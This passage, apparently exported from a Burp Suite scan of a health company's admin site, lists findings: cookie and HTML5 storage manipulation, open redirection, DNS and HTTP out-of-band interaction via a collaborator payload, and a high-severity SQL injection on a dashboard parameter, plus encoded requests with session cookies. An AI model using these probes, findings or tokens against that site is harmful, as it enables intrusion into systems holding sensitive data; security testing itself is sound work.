at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at Object.val (https://admin.miradorhealth.com/js/jquery.min.js:4:9797)
at HTMLInputElement.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/jquery.min.js:4:25646)
at https://admin.miradorhealth.com/js/jquery.min.js:2:932
at Function.map (https://admin.miradorhealth.com/js/jquery.min.js:2:3613)
at Object.map (https://admin.miradorhealth.com/js/jquery.min.js:2:900)
at Object.serializeArray (https://admin.miradorhealth.com/js/jquery.min.js:4:25614)
at Object.serialize (https://admin.miradorhealth.com/js/jquery.min.js:4:25337)
at filterData (https://admin.miradorhealth.com/:728:73)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.TWPef (&lt;anonymous&gt;:1:111447)
at Object.AaaMx (&lt;anonymous&gt;:1:541530)
at Object.defineProperty.set (&lt;anonymous&gt;:1:551606)
at setCookie (https://admin.miradorhealth.com/js/app.js:148:18)
at filterData (https://admin.miradorhealth.com/:773:13)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>UserTotalEvents=https://admin.miradorhealth.com/UserTotalEvents/?ajax=true&amp;filter=true&amp;draw=1&amp;dispenser_id=&amp;is_compliant=&amp;created_at=eiac69xt8r%252527%252522%60&apos;%22%2Feiac69xt8r%2F%3E%3Ceiac69xt8r%2F%5C%3Ee1aap748zx%26;expires=Mon, 13 Jan 2025 18:46:31 GMT;path=/</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId>created_at</sourceElementId>
      <sourceElementName>created_at</sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-dark float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;filter&apos;)&quot;&gt;Submit&lt;/button&gt;</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>8148519625465780224</serialNumber>
    <type>5246720</type>
    <name><![CDATA[HTML5 storage manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
<p>HTML5 storage manipulation arises when a script stores controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will cause the user's browser to store attacker-controllable data.</p>
<p>This behavior does not in itself constitute a security vulnerability. However, if the application later reads the data back from storage and processes it in an unsafe way, then an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.
</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based HTML5 storage manipulation is not to place in HTML5 storage any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/html5-storage-manipulation">Web Security Academy: HTML5 storage manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153: Input Data Manipulation</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based HTML5 storage manipulation. Data is read from <b>location.pathname</b> and passed to <b>localStorage.setItem.name</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWo3YXZubDV1dDBhdGtzYTRiM2RvNWQ3amM2OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1TWks2eDZNbW5qckNaeUJYMTBpcmU0VlA3WTNHNzJNSHpLaVR2cjFscktoVDkyaUw5c0ZmWi9wcnA2aDg3L0FCU002NHpMTlNub01GNC9TY2Nmc3hHR3p0WXpWbithcEFIempVb29abFgyViswYk9XRk1OajRKYmtSWUNHOyBBV1NBTEJDT1JTPVNaSzZ4Nk1tbmpyQ1p5QlgxMGlyZTRWUDdZM0c3Mk1IektpVHZyMWxyS2hUOTJpTDlzRmZaL3BycDZoODcvQUJTTTY0ekxOU25vTUY0L1NjY2ZzeEdHenRZelZuK2FwQUh6alVvb1psWDJWKzBiT1dGTU5qNEpia1JZQ0cNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>location.pathname</source>
      <sink>localStorage.setItem.name</sink>
      <sourceStackTrace>at Object._0x165f99 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:557377)
at get pathname (&lt;anonymous&gt;:1:249642)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:147:26)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/:746:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3588)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at Object.uXLIG (&lt;anonymous&gt;:1:437510)
at Object.yUDKe (&lt;anonymous&gt;:1:452444)
at _0xdc6a5f.tYxZd.quoteContext [as setItem] (&lt;anonymous&gt;:1:453117)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:146:487)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/:746:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/:328:3588)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue>/////z8j09psofk%27%22%60&apos;%22/z8j09psofk/%3E%3Cz8j09psofk//%3Ezhbvge6fsa&amp;</sourceValue>
      <sinkValue>DataTables_records_/////z8j09psofk%27%22%60&apos;%22/z8j09psofk/%3E%3Cz8j09psofk//%3Ezhbvge6fsa&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-secondary float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;reset&apos;)&quot;&gt;Reset Filters&lt;/b</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>1182278917662388224</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>input.value</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPTFtcjFiMjBiaXJzNmpkbXUyMjZ0azY0NHVyOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj14a21La2x4RGEyRTZCbXE4RzU0bldOUjZGK041SjRSWEFYcHFIVkthQndpenVCekkvUzJibjBOZTF0bjk1WEdBL1dDSmgwVXQxY3llR2MyS0xhT1BFT2htUXRLaVh3NEJDVnNhRXBDQzJ4WWdLTHM0OVk0RWVvbFVsbTkrOyBBV1NBTEJDT1JTPXhrbUtrbHhEYTJFNkJtcThHNTRuV05SNkYrTjVKNFJYQVhwcUhWS2FCd2l6dUJ6SS9TMmJuME5lMXRuOTVYR0EvV0NKaDBVdDFjeWVHYzJLTGFPUEVPaG1RdEtpWHc0QkNWc2FFcENDMnhZZ0tMczQ5WTRFZW9sVWxtOSsNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlci8zOTkvQ2hhbmdlUGFzc3dvcmQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/:41:163)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at advSearch (https://admin.miradorhealth.com/js/scripts.js?v=f72d42:11:11)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/:41:148)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>https://admin.miradorhealth.com/Search/cuajlgk036%2527%2522`&apos;&quot;/cuajlgk036/&gt;&lt;cuajlgk036/\&gt;ug3lx2qayc&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>keyup</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;input class=&quot;form-control&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot; onkeyup=&quot;advSearc</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>1172471862094414848</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>og83mp742l9zuj3wz3vwkvkybphj5cy0rzfp2fq4.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9nODNtcDc0Mmw5enVqM3d6M3Z3a3ZreWJwaGo1Y3kwcnpmcDJmcTQub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:48:31.626 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>og83mp742l9zuj3wz3vwkvkybphj5cy0rzfp2fq4.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>754047093330843648</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>og83mp742l9zuj3wz3vwkvkybphj5cy0rzfp2fq4.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9nODNtcDc0Mmw5enVqM3d6M3Z3a3ZreWJwaGo1Y3kwcnpmcDJmcTQub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:48:32.556 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9nODNtcDc0Mmw5enVqM3d6M3Z3a3ZreWJwaGo1Y3kwcnpmcDJmcTQub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nbGxnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5985717266165583872</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Dashboard]]></path>
    <location><![CDATA[/Dashboard [typeId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
